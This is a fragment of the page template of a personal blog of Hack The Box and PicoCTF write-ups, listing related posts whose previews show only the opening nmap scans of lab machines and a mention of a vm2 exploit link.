ml-1 mt-2"><li><a href="/posts/Tabby-from-HTB/">Tabby from HTB</a><li><a href="/posts/Stonks-from-PicoCTF/">Stonks from PicoCTF</a><li><a href="/posts/Backdoor-from-HTB/">Backdoor from HTB</a><li><a href="/posts/Antique-from-HTB/">Antique from HTB</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/picoctf/">PicoCTF</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Codify-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Codify from HTB"</h3><div class="text-muted small"><p> Codify from HTB page Nmap gave nothing unusual. Went to the site and saw vm2and then went for vm2 exploitand got to this github: https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244 c...</p></div></div></a></div><div class="card"> <a href="/posts/CozyHosting-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>CozyHosting from HTB</h3><div class="text-muted small"><p> CozyHosting from HTB page Nmap gave this: nmap -sCV --min-rate 4000 10.10.11.230 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 18:47 +04 Nmap scan report for cozyhosting.htb (10.10.11.23...</p></div></div></a></div><div class="card"> <a href="/posts/Devvortex-from-HTB/"><div class="card-body"> <em class="small" data-ts="1725580800" data-df="ll" > Sep 6, 2024 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Devvortex from HTB</h3><div class="text-muted small"><p> Devvortex from HTB page Nmapgave this: nmap -sCV --min-rate 4000 10.10.11.242 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-07 15:06 +04 Nmap scan report for devvortex.htb (10.10.11.242) Ho...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Packer-from-PicoCTF/" class="btn btn-outline-primary" prompt="Older"><p>Packer from PicoCTF</p></a> <a href="/posts/Paper-from-HTB/" class="btn btn-outline-primary" prompt="Newer"><p>Paper from HTB</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/darkfears31">kaikaci</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hack-the-box/">Hack The Box</a> <a class="post-tag" href="/tags/picoctf/">PicoCTF</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
